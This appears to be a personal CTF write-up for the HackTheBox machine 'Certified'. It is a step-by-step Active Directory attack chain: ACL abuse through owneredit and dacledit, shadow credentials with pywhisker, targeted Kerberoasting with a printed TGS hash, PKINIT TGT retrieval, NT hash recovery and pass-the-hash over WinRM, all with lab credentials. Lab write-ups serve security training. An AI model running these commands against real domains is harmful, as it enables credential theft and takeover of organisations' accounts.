---
title: "Certified"
description: ""
summary: ""
date: 2023-09-07T16:06:50+02:00
lastmod: 2023-09-07T16:06:50+02:00
draft: false
weight: 800
toc: true
sidebar:
  collapsed: true
seo:
  title: "" # custom title (optional)
  description: "" # custom description (recommended)
  canonical: "" # custom canonical URL (optional)
  robots: "" # custom robot tags (optional)
  noindex: false # false (default) or true
---


#Shadow_credential
Target : 10.10.11.41

Scan :
```sh
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2024-11-24T16:20:06+00:00; +7h00m00s from scanner time.
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36

```

- Initial credential : 
`judith.mader : judith09`

- Users found : 
```sh
Management
management_svc
ca_operator
alexander.huges
harry.wilson
gregory.cameron
```

```sh
bloodhound-python -d 'certified.htb' -u 'judith.mader' -p 'judith09' -ns 10.10.11.41 -dc DC01.certified.htb -c all
```

- Write Owner ACL : 
```sh
owneredit.py -action write -new-owner 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'
```

```sh
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```

```sh
net rpc group addmem "MANAGEMENT" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "DC01.certified.htb"
```

- Generic write : 
```sh
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "list"
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add" --filename key --export PEM
```
`Not working ... , My bad it works`

```sh
[Nov 24, 2024 - 11:13:08 (CET)] exegol-Kraken pywhisker # targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (management_svc)
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$347d9440e08d552b9f7fd2c86c0d67b1$a75cf4ebbff8c627819e52b02ea06dc744b856b03b5b48b1b34ec6bb1bc811e76b30414328e78dd1d8e5f7ce8d16b655d73341ad31c9082352e00bac3db801d6d00a41db0043ac6e765d465d2e7212832877497db297683dd364d88f1a1beee2201a780608a231dea290ffe766581151c0e42720962fe7a04ca52b3a05094052c527600abb4ba78c41d3bbe012fc899edc6387899b04c4231a2d3e1f4239f4159508ce82b5cae73f4a3765341da181c2d704917e55960d0d230f634118ea749a8ecdfae6b1fe5476fad0b2be0c0e3f4c8e52079027224914c325e1e5dc08750239132373e8feafafe888b84ad3b70a081b89f64edea1afe36574ab3fec4dcf693bb9a6ee9626e29b9ce1c13a756dc4de44f8275ffff033de18d9c30399aea39c8609512995b768a045de1576c877a5371c2eb9d9d3f802b3167cb91277bafbf0e0ea963518b39ed1fd9480c24410f447af4a175e7727e67a593cb97612af3a18d9910d33876d536f5857ff69b7511294692f6cd3ef467136801bb2585ae80d01372d62c236052b1ca69badec1abe4d93cb744dd81d7d82edbad9c3038314a946c1c0afce9705ba822897689c091577bc70ee605409cd6ba5180a48e6f4eb954e1e4eb865b4b23bb9af3b1b955d6ce8f647cb636054f4fcf1989e3488a4eb41548820bcb626c17302a8c8311fb9ca7f688d5d58e0136c173327376b21094499bfe057b032d33a402becbc5247df02803b113ddece0e7d743a4aaa5e4d9b6d9b5a8a0a80db72c506400d88a237f4f943617be7070fd48a2896612bb319a0fedb8db404b66c09de0fa7f1ddccc82aced343a6910c0255c8c17366d88ff3cd0642a7f840271cccbdb8cdef253b17740dd1bec0672f1f6ba9be16e27c64e18bee537dbb19a39cabce1c1bd32c13ccbfdb9f074a2ca717b5b22f15589b03027a74500a743ca30d75318cf8b35352d9470083d389f0548b70ac65f7c2f9a549675c786e18cfae652548d82af2aed789feef1442e4f4c7df36505b4f89735544440212e49d34d7e9cb6c707c08a1c22cc7dc0dcf286ffa10d713a21d1b88611cc45f87691f082d86deeceecd5fe9c2f51c61dd6552c2651c404b4fd5afde44fa32e93ee4b3040b6fd5cf8cd96589cec5a0aad0403ff8af9403cea9fbdfd9c30bb3d1750fe3e05673504cb957cdd748b6174bca133c8f8d5b6189e8a0dab82aac132fba6ef54cc6382a9fdaa26ef94fdd73577cc3781453471cfc92fb486128d9e458da7ed2c1dd63f50257e0a3f3022598c455c03806fa77e9f288ae97c77c46aaee4db098cb9e0c430fc0fe2134f2a1e8cfc86d784298bd94d020c9adf95a849c66574ce2d84b8dfac246271223216ff9e8b12c42040811d899dd9f6cc8cac518197eedc4f00a25568189128bf789ab6d5fc4b4c508914088008a6da9b230c2e5fda03c9510e8f759f4f6f70d2b4073a2fc06e1d4b86e5756673e5a9077e9853a53faafb955b37c64f38c9b92a15076e233febd80a5d5364de8618466cd5c3779a19beb7f5b0cdfbf69c1174f19e8b6b22a5a8855a46c771d87d2fa835c8c1c1e9ea9007b3d
```
`Can't crack it `

- Get a tgt with the certificate :
```sh
gettgtpkinit.py -cert-pfx "ACpe7bSn.pfx" -pfx-pass "jm2eQRJ4KGuPQ11LUSu7" "certified.htb/management_svc" "TGT_CCACHE_FILE"
#or
gettgtpkinit.py -cert-pem key_cert.pem -key-pem key_priv.pem certified.htb/management_svc management.ccache
export KRB5CCNAME=management.ccache
```
- Recover the Nt hash :
```sh
getnthash -key "725378f2fe6e5decc64e196fcd98ea97a20cebbe5d60e83806d6356c9be52178" certified.htb/management_svc

a091c1832bcdd4677c28b5a6a1295584
```
- Pass the hash : 
```sh
evil-winrm -u "management_svc" -H "a091c1832bcdd4677c28b5a6a1295584" -i "$t"
```